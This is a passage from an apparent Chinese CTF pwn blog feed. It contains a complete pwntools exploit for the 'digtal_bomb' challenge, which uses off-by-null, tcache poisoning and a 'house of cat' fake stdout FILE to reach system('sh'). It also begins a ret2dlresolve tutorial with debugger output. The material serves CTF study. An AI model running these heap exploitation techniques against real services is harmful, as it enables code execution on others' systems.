p64(fake_IO_addr + <span class="number">0x40</span>) <span class="comment"># _wida_data-&gt;_wide_vtable</span></span><br></pre></td></tr></table></figure><p>如果用<code>_IO_cleanup</code>触发的话（也就是打<code>FSOP</code>），<code>vtable</code>调用的是<code>overflow</code>，我们需要修改虚表偏移，修改为<code>libc_base + libc.sym[&quot;_IO_wfile_jumps&quot;] + 0x30</code>，且要求<code>rcx</code>不为0<br>然而打<code>FSOP</code>的情况，还是直接打<code>house of apple</code>吧</p><h2 id="0x05-湾区杯2025-digtal-bomb"><a href="#0x05-湾区杯2025-digtal-bomb" class="headerlink" title="0x05 湾区杯2025 digtal_bomb"></a>0x05 湾区杯2025 digtal_bomb</h2><p>利用<code>off-by-null</code>打<code>house of cat</code></p><p>exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">filename = <span class="string">&quot;digtal_bomb_patched&quot;</span></span><br><span class="line">libcname = <span class="string">&quot;/home/r3t2/.config/cpwn/pkgs/2.35-0ubuntu3.10/amd64/libc6_2.35-0ubuntu3.10_amd64/lib/x86_64-linux-gnu/libc.so.6&quot;</span></span><br><span class="line">host = <span class="string">&quot;127.0.0.1&quot;</span></span><br><span class="line">port = <span class="number">1337</span></span><br><span class="line">elf = context.binary = ELF(filename)</span><br><span class="line"><span class="keyword">if</span> libcname:</span><br><span class="line">    libc = ELF(libcname)</span><br><span class="line">gs = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">b *$rebase(0x19d6)</span></span><br><span class="line"><span class="string">set debug-file-directory /home/r3t2/.config/cpwn/pkgs/2.35-0ubuntu3.10/amd64/libc6-dbg_2.35-0ubuntu3.10_amd64/usr/lib/debug</span></span><br><span class="line"><span class="string">set directories /home/r3t2/.config/cpwn/pkgs/2.35-0ubuntu3.10/amd64/glibc-source_2.35-0ubuntu3.10_all/usr/src/glibc/glibc-2.35</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">start</span>():</span><br><span class="line">    <span class="keyword">if</span> args.P:</span><br><span class="line">        <span class="keyword">return</span> process(elf.path)</span><br><span class="line">    <span class="keyword">elif</span> args.R:</span><br><span class="line">        <span class="keyword">return</span> remote(host, port)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> gdb.debug(elf.path, gdbscript = gs)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">bomb</span>():</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;: &#x27;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&#x27;0&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;: &#x27;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;guess :&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io = start()</span><br><span class="line"></span><br><span class="line">bomb()</span><br><span class="line"></span><br><span class="line"><span class="comment"># ========================================</span></span><br><span class="line"><span class="comment"># Welcome to the message board!</span></span><br><span class="line"><span class="comment"># Please choose an option:</span></span><br><span class="line"><span class="comment"># 1. New message board</span></span><br><span class="line"><span class="comment"># 2. Delete message board</span></span><br><span class="line"><span class="comment"># 3. Show message board</span></span><br><span class="line"><span class="comment"># 4. Save the game</span></span><br><span class="line"><span class="comment"># Your choice &gt;&gt;</span></span><br><span class="line">menu = <span class="string">b&#x27;&gt;&gt;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">new</span>(<span class="params">idx, size, data = <span class="string">b&quot;deadbeef&quot;</span></span>):</span><br><span class="line">    io.recvuntil(menu)</span><br><span class="line">    io.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    io.recvuntil(menu)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line">    io.recvuntil(menu)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(size)) <span class="comment"># 0x10 &lt; size &lt;= 0x800</span></span><br><span class="line">    io.send(data)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">idx</span>):</span><br><span class="line">    io.recvuntil(menu)</span><br><span class="line">    io.sendline(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    io.recvuntil(menu)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line">    io.recvuntil(menu)</span><br><span class="line">    io.sendline(<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    io.recvuntil(menu)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx, data</span>): <span class="comment">#once data--&gt;0x10</span></span><br><span class="line">    io.recvuntil(menu)</span><br><span class="line">    io.sendline(<span class="string">b&#x27;666&#x27;</span>)</span><br><span class="line">    io.recvuntil(menu)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line">    io.send(data)</span><br><span class="line"></span><br><span class="line">new(<span class="number">0</span>, <span class="number">0x410</span>) <span class="comment"># 0</span></span><br><span class="line">new(<span class="number">1</span>, <span class="number">0x100</span>) <span class="comment"># 1  </span></span><br><span class="line">new(<span class="number">2</span>, <span class="number">0x430</span>) <span class="comment"># 2</span></span><br><span class="line">new(<span class="number">3</span>, <span class="number">0x430</span>) <span class="comment"># 3   --------------------ck3的堆地址最低字节为\x00----------------------</span></span><br><span class="line">new(<span class="number">4</span>, <span class="number">0x100</span>) <span class="comment"># 4</span></span><br><span class="line">new(<span class="number">5</span>, <span class="number">0x480</span>) <span class="comment"># 5</span></span><br><span class="line">new(<span class="number">6</span>, <span class="number">0x420</span>) <span class="comment"># 6</span></span><br><span class="line">new(<span class="number">7</span>, <span class="number">0x100</span>) <span class="comment"># 7</span></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">free(<span class="number">3</span>)</span><br><span class="line">free(<span class="number">6</span>)</span><br><span class="line"></span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">new(<span class="number">0</span>, <span class="number">0x450</span>, <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x438</span>+p16(<span class="number">0x551</span>)) <span class="comment"># 0 ck2和极小部分ck3  ----------ck3的size被改为0x551,注意这里的p16，如果是p64，ck3的fd会被修改-----------</span></span><br><span class="line"> </span><br><span class="line">new(<span class="number">2</span>, <span class="number">0x410</span>) <span class="comment"># 2 部分ck3 </span></span><br><span class="line">new(<span class="number">3</span>, <span class="number">0x420</span>) <span class="comment"># 3 ck6</span></span><br><span class="line">new(<span class="number">6</span>, <span class="number">0x410</span>) <span class="comment"># 6 ck0</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">#修复ck0-&gt;bk</span></span><br><span class="line">free(<span class="number">6</span>)</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">new(<span class="number">2</span>, <span class="number">0x410</span>) <span class="comment"># 2 ck0</span></span><br><span class="line">new(<span class="number">6</span>, <span class="number">0x410</span>) <span class="comment"># 6 部分ck3</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">#修复ck6-&gt;fd</span></span><br><span class="line">free(<span class="number">6</span>)</span><br><span class="line">free(<span class="number">3</span>)</span><br><span class="line">free(<span class="number">5</span>) <span class="comment">#delete(5)会unlink ck6 ,合成一个大小为0x8c1的chunk</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">#-----------------切割0x8c1的chunk,同时覆盖ck6-&gt;fd低字节为\x00-------------</span></span><br><span class="line">new(<span class="number">3</span>, <span class="number">0x4f0</span>, <span class="string">b&quot;a&quot;</span>*<span class="number">0x488</span> + p64(<span class="number">0x431</span>)) <span class="comment"># 3</span></span><br><span class="line">new(<span class="number">5</span>, <span class="number">0x3b0</span>) <span class="comment"># 5</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">#------------------通过ck4把ck5的prev_size改为0x550,size的最低字节变为\x00-------------</span></span><br><span class="line">free(<span class="number">4</span>)</span><br><span class="line">new(<span class="number">4</span>, <span class="number">0x108</span>, <span class="string">b&quot;a&quot;</span>*<span class="number">0x100</span> + p64(<span class="number">0x550</span>))<span class="comment">#4</span></span><br><span class="line">new(<span class="number">6</span>, <span class="number">0x410</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#6 ------------------把largebin中的部分ck3拿出,这里造了一个uaf，至关重要------------------</span></span><br><span class="line"><span class="comment">#------------------那么free(3)通过prev_size找到的chunk就是伪造了size的ck3，前面已经使得其满足unlink的条件----------------</span></span><br><span class="line">free(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">new(<span class="number">3</span>, <span class="number">0x18</span>)<span class="comment">#3--------------------让部分ck3作为unsorted bin的fd----------------</span></span><br><span class="line">show(<span class="number">6</span>)</span><br><span class="line">io.recvuntil(<span class="string">b&quot;:\n&quot;</span>)</span><br><span class="line">libc_base = u64(io.recvn(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>)) - <span class="number">0x1ebbe0</span> - <span class="number">0x2f100</span></span><br><span class="line">log.success(<span class="string">&quot;libc_base --&gt; &quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line"><span class="comment">#--------------------因为部分ck3之前既在largebin中，又在unsorted bin中，所以可以让两个指针指向ck3</span></span><br><span class="line"><span class="comment">#--------------------同时让其大小变为0x400，这里仿佛硬造出了一个uaf,6、8都指向部分ck3-------------------</span></span><br><span class="line">new(<span class="number">8</span>, <span class="number">0x3f0</span>)<span class="comment">#8 这里让部分ck3的size变成0x400让其可以进入tcache进而泄露heapbase------------</span></span><br><span class="line">new(<span class="number">9</span>, <span class="number">0x60</span>, <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x18</span> + p64(<span class="number">0x91</span>))<span class="comment">#9  ------------------ck4的chunk大小本来为0x110，这一步让最初ck4的chunk的大小变为0x90----------</span></span><br><span class="line"><span class="comment">#这样做主要是因为ck4没有被free，相当于uaf，可以伪造chunk size实现越界edit</span></span><br><span class="line">new(<span class="number">10</span>, <span class="number">0x3f0</span>)<span class="comment">#10  --------------------申请一个0x400大小的chunk，为了后面打tcache poison</span></span><br><span class="line">free(<span class="number">6</span>)</span><br><span class="line">show(<span class="number">8</span>)</span><br><span class="line">io.recvuntil(<span class="string">&quot;:\n&quot;</span>)</span><br><span class="line">heap_base= (u64(io.recv(<span class="number">5</span>).ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>)) &lt;&lt; <span class="number">12</span>) </span><br><span class="line">log.success(<span class="string">&quot;heap_base --&gt; &quot;</span>+<span class="built_in">hex</span>(heap_base))</span><br><span class="line"></span><br><span class="line">stdout = libc.sym[<span class="string">&#x27;_IO_2_1_stdout_&#x27;</span>] + libc_base</span><br><span class="line">free(<span class="number">4</span>)  <span class="comment">#0x90 tcache</span></span><br><span class="line">free(<span class="number">10</span>) <span class="comment">#0x400 tcache :10-&gt;6</span></span><br><span class="line"><span class="comment">#通过那个0x90的chunk来实现edit(10)进行tcache poison，构思太巧妙了</span></span><br><span class="line">new(<span class="number">10</span>,<span class="number">0x80</span>, <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x48</span> + p64(<span class="number">0x401</span>) + p64((heap_base+<span class="number">0x10a0</span>)&gt;&gt;<span class="number">12</span>^stdout))</span><br><span class="line"></span><br><span class="line"><span class="comment"># house of cat 打 stdout</span></span><br><span class="line">fake_IO_addr = stdout</span><br><span class="line">fake_IO = <span class="string">b&#x27;sh&#x27;</span> <span class="comment"># _flags</span></span><br><span class="line">fake_IO = fake_IO.ljust(<span class="number">0x30</span> + <span class="number">0x20</span>, <span class="string">b&#x27;\x00&#x27;</span>) + p64(fake_IO_addr + <span class="number">0x120</span>) <span class="comment"># rdx = [rax+0x20] / _wide_data-&gt;_IO_write_ptr 此处我们不需要控制rdx，随便设置一个大于0的值即可，满足大于_wide_data-&gt;_IO_write_base</span></span><br><span class="line">fake_IO = fake_IO.ljust(<span class="number">0x40</span> + <span class="number">0x18</span>, <span class="string">b&#x27;\x00&#x27;</span>) + p64(libc_base + libc.sym[<span class="string">&quot;system&quot;</span>]) <span class="comment"># _wide_data-&gt;_wide_vtable-&gt;_IO_WOVERFLOW</span></span><br><span class="line">fake_IO = fake_IO.ljust(<span class="number">0x68</span>, <span class="string">b&#x27;\x00&#x27;</span>) + p64(<span class="number">0</span>) <span class="comment"># _chain</span></span><br><span class="line">fake_IO = fake_IO.ljust(<span class="number">0x88</span>, <span class="string">b&#x27;\x00&#x27;</span>) + p64(fake_IO_addr + <span class="number">0x120</span>) <span class="comment"># _lock 指向可写地址</span></span><br><span class="line">fake_IO = fake_IO.ljust(<span class="number">0xa0</span>, <span class="string">b&#x27;\x00&#x27;</span>) + p64(fake_IO_addr + <span class="number">0x30</span>) <span class="comment"># _wida_data</span></span><br><span class="line">fake_IO = fake_IO.ljust(<span class="number">0xc0</span>, <span class="string">b&#x27;\x00&#x27;</span>) + p32(<span class="number">0xffffffff</span>) <span class="comment"># _mode = -1</span></span><br><span class="line">fake_IO = fake_IO.ljust(<span class="number">0xd8</span>, <span class="string">b&#x27;\x00&#x27;</span>) + p64(libc_base + libc.sym[<span class="string">&quot;_IO_wfile_jumps&quot;</span>] + <span class="number">0x10</span>) <span class="comment"># vtable</span></span><br><span class="line">fake_IO = fake_IO.ljust(<span class="number">0x30</span> + <span class="number">0xe0</span>, <span class="string">b&#x27;\x00&#x27;</span>) + p64(fake_IO_addr + <span class="number">0x40</span>) <span class="comment"># _wida_data-&gt;_wide_vtable</span></span><br><span class="line"></span><br><span class="line">new(<span class="number">4</span>, <span class="number">0x3f0</span>)</span><br><span class="line">new(<span class="number">6</span>, <span class="number">0x3f0</span>,  fake_IO)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> pwn </category>
          
          <category> heap </category>
          
          <category> _IO_FILE </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 笔记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>关于ret2dlresolve</title>
      <link href="/2025/09/10/%E5%85%B3%E4%BA%8Eret2dlresolve/"/>
      <url>/2025/09/10/%E5%85%B3%E4%BA%8Eret2dlresolve/</url>
      
        <content type="html"><![CDATA[<h2 id="0x00"><a href="#0x00" class="headerlink" title="0x00"></a>0x00</h2><p>时值 moectf2025 ，出了一题打<code>ret2dlresolve</code>（虽然仍然可以打<code>ret2libc</code>），回想起自从学习了<code>re2dlresolve</code>后几乎没碰到过只能打这个的题，所以也没有记录，于是借此机会记录一下<br>参考博客<a href="https://xz.aliyun.com/news/17612">https://xz.aliyun.com/news/17612</a></p><h2 id="0x01-延迟绑定流程-PLT与GOT"><a href="#0x01-延迟绑定流程-PLT与GOT" class="headerlink" title="0x01 延迟绑定流程 PLT与GOT"></a>0x01 延迟绑定流程 PLT与GOT</h2><p><del>炒炒冷饭（</del></p><h4 id="延迟绑定流程"><a href="#延迟绑定流程" class="headerlink" title="延迟绑定流程"></a>延迟绑定流程</h4><p>初次调用</p><p><img src="/images/plt-got1.png"></p><p>解析完成后，后续调用</p><p><img src="/images/plt-got2.png"></p><p>我们简单验证一下，调用前</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; plt</span><br><span class="line">Section .plt 0x401020 - 0x401070:</span><br><span class="line">No symbols found in section .plt</span><br><span class="line">Section .plt.sec 0x401070 - 0x4010b0:</span><br><span class="line">0x401070: write@plt</span><br><span class="line">0x401080: strlen@plt</span><br><span class="line">0x401090: setbuf@plt</span><br><span class="line">0x4010a0: read@plt</span><br><span class="line"></span><br><span class="line">pwndbg&gt; got</span><br><span class="line">Filtering out read-only entries (display them with -r or --show-readonly)</span><br><span class="line"></span><br><span class="line">State of the GOT of /home/r3t2/ctf/moectf2025/pwn/nowaytoleak/pwn_patched:</span><br><span class="line">GOT protection: Partial RELRO | Found 4 GOT entries passing the filter</span><br><span class="line">[0x404018] write@GLIBC_2.2.5 -&gt; 0x401030 ◂— endbr64</span><br><span class="line">[0x404020] strlen@GLIBC_2.2.5 -&gt; 0x401040 ◂— endbr64</span><br><span class="line">[0x404028] setbuf@GLIBC_2.2.5 -&gt; 0x401050 ◂— endbr64</span><br><span class="line">[0x404030] read@GLIBC_2.2.5 -&gt; 0x401060 ◂— endbr64</span><br><span class="line"></span><br><span class="line">pwndbg&gt; x/8i 0x401070</span><br><span class="line">   0x401070 &lt;write@plt&gt;:        endbr64</span><br><span class="line">   0x401074 &lt;write@plt+4&gt;:      bnd jmp QWORD PTR [rip+0x2f9d]        # 0x404018 &lt;write@got.plt&gt;</span><br><span class="line">   0x40107b &lt;write@plt+11&gt;:     nop    DWORD PTR [rax+rax*1+0x0]</span><br><span class="line">   0x401080 &lt;strlen@plt&gt;:       endbr64</span><br><span class="line">   0x401084 &lt;strlen@plt+4&gt;:     bnd jmp QWORD PTR [rip+0x2f95]        # 0x404020 &lt;strlen@got.plt&gt;</span><br><span class="line">   0x40108b &lt;strlen@plt+11&gt;:    nop    DWORD PTR [rax+rax*1+0x0]</span><br><span class="line">   0x401090 &lt;setbuf@plt&gt;:       endbr64</span><br><span class="line">   0x401094 &lt;setbuf@plt+4&gt;:     bnd jmp QWORD PTR [rip+0x2f8d]        # 0x404028 &lt;setbuf@got.plt&gt;</span><br><span class="line">   </span><br><span class="line">pwndbg&gt; x/8i *0x404018</span><br><span class="line">   0x401030:    endbr64</span><br><span class="line">   0x401034:    push   0x0</span><br><span class="line">   0x401039:    bnd jmp 0x401020</span><br><span class="line">   0x40103f:    nop</span><br><span class="line">   0x401040:    endbr64</span><br><span class="line">   0x401044:    push   0x1</span><br><span class="line">   0x401049:    bnd jmp 0x401020</span><br><span class="line">   0x40104f:    nop</span><br><span class="line">   </span><br><span class="line">pwndbg&gt; x/8i 0x401020</span><br><span class="line">   0x401020:    push   QWORD PTR [rip+0x2fe2]        # 0x404008</span><br><span class="line">   0x401026:    bnd jmp QWORD PTR [rip+0x2fe3]        # 0x404010</span><br><span class="line">   0x40102d:    nop    DWORD PTR [rax]</span><br><span class="line">   0x401030:    endbr64</span><br><span class="line">   0x401034:    push   0x0</span><br><span class="line">   0x401039:    bnd jmp 0x401020</span><br><span class="line">   0x40103f:    nop</span><br><span class="line">   0x401040:    endbr64</span><br><span class="line">   </span><br><span class="line">pwndbg&gt; tele 0x404010</span><br><span class="line">00:0000│  0x404010 (_GLOBAL_OFFSET_TABLE_+16) —▸ 0x7ffff7fe7bc0 ◂— endbr64</span><br><span class="line">01:0008│  0x404018 (write@got[plt]) —▸ 0x401030 ◂— endbr64</span><br><span class="line">02:0010│  0x404020 (strlen@got[plt]) —▸ 0x401040 ◂— endbr64</span><br><span class="line">03:0018│  0x404028 (setbuf@got[plt]) —▸ 0x401050 ◂— endbr64</span><br><span class="line">04:0020│  0x404030 (read@got[plt]) —▸ 0x401060 ◂— endbr64</span><br><span class="line">05:0028│  0x404038 ◂— 0</span><br><span class="line">... ↓     2 skipped</span><br><span class="line"></span><br><span class="line">pwndbg&gt; x/8i 0x7ffff7fe7bc0</span><br><span class="line">   0x7ffff7fe7bc0:      endbr64</span><br><span class="line">   0x7ffff7fe7bc4:      push   rbx</span><br><span class="line">   0x7ffff7fe7bc5:      mov    rbx,rsp</span><br><span class="line">   0x7ffff7fe7bc8:      and    rsp,0xffffffffffffffc0</span><br><span class="line">   0x7ffff7fe7bcc:      sub    rsp,QWORD PTR [rip+0x14b35]        # 0x7ffff7ffc708 &lt;_rtld_global_ro+232&gt;</span><br><span class="line">   0x7ffff7fe7bd3:      mov    QWORD PTR [rsp],rax</span><br><span class="line">   0x7ffff7fe7bd7:      mov    QWORD PTR [rsp+0x8],rcx</span><br><span class="line">   0x7ffff7fe7bdc:      mov    QWORD PTR [rsp+0x10],rdx</span><br></pre></td></tr></table></figure><p>注意到这里是<code>.plt.sec</code>而非<code>.plt</code>，下面再分析。这里最后先<code>push   QWORD PTR [rip+0x2fe2]</code>最后<code> jmp QWORD PTR [rip+0x2fe3]</code>，其实是<code>push link_map</code>，<code> jmp _dl_runtime_resolve</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/2gx 0x404008</span><br><span class="line">0x404008:       0x00007ffff7ffe190      0x00007ffff7fe7bc0</span><br></pre></td></tr></table></figure><h4 id="PLT（-plt-plt-sec）"><a href="#PLT（-plt-plt-sec）" class="headerlink" title="PLT（.plt&#x2F;.plt.sec）"></a>PLT（.plt&#x2F;.plt.sec）</h4><p>那么现在来分析一下<code>.plt.sec</code>的问题，以及它与传统的<code>.plt</code>有何不同。在传统<code>.plt</code>中</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">func@plt:</span><br><span class="line">jmp    [func@got.plt]  ; 第一次跳转，直接跳转到 GOT 中存储的地址</span><br><span class="line">push   offset          ; offset 为该函数在 GOT 中的索引，如果是第一次调用，GOT 中的地址指向下一条指令</span><br><span class="line">jmp    .plt[0]            ; 跳转到 PLT 的“调度程序”</span><br></pre></td></tr></table></figure><p>这个<code>.plt[0]</code>正是指代</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/3i 0x401020</span><br><span class="line">   0x401020:    push   QWORD PTR [rip+0x2fe2]        # 0x404008 push link_map</span><br><span class="line">   0x401026:    bnd jmp QWORD PTR [rip+0x2fe3]        # 0x404010 jmp _dl_runtime_resolve</span><br><span class="line">   0x40102d:    nop    DWORD PTR [rax]</span><br></pre></td></tr></table></figure><p>此处，结构如下所示</p><p><img src="/images/plt0.png"></p><p>其中 n 为函数 <code>bar</code> 在 GOT 表中的值的索引，<code>bar@GOT</code> 中初始值为 <code>jmp *(bar@GOT)</code> 指令的下一条指令，也就是说第一次调用 <code>bar</code> 函数的时候会继续执行跳转至 <code>PLT0</code> 进行 <code>bar@GOT</code> 的重定位并调用 <code>bar</code> 函数；第二次调用 <code>bar</code> 函数的时候由于 <code>bar@GOT</code> 已完成重定位因此会直接跳转至 <code>bar</code> 函数。<br>至于<code>.plt.sec</code>，从 <strong>binutils 2.29 &#x2F; glibc 2.26</strong> 开始，引入了 <code>.plt.sec</code>，目的有两个：</p><ul><li>优化性能：对于不需要 <code>lazy binding</code> 的符号直接生成 <code>.plt.sec</code> 的短跳转，而不是冗余的 <code>.plt</code> 入口。</li><li>减少攻击面：避免额外的 <code>push reloc_index; jmp plt[0]</code></li></ul><p>我们看调试的<code>.plt.sec</code>信息</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/8i 0x401070</span><br><span class="line">   0x401070 &lt;write@plt&gt;:        endbr64</span><br><span class="line">   0x401074 &lt;write@plt+4&gt;:      bnd jmp QWORD PTR [rip+0x2f9d]        # 0x404018 &lt;write@got.plt&gt;</span><br><span class="line">   0x40107b &lt;write@plt+11&gt;:     nop    DWORD PTR [rax+rax*1+0x0]</span><br><span class="line">   0x401080 &lt;strlen@plt&gt;:       endbr64</span><br><span class="line">   0x401084 &lt;strlen@plt+4&gt;:     bnd jmp QWORD PTR [rip+0x2f95]        # 0x404020 &lt;strlen@got.plt&gt;</span><br><span class="line">   0x40108b &lt;strlen@plt+11&gt;:    nop    DWORD PTR [rax+rax*1+0x0]</span><br><span class="line">   0x401090 &lt;setbuf@plt&gt;:       endbr64</span><br><span class="line">   0x401094 &lt;setbuf@plt+4&gt;:     bnd jmp QWORD 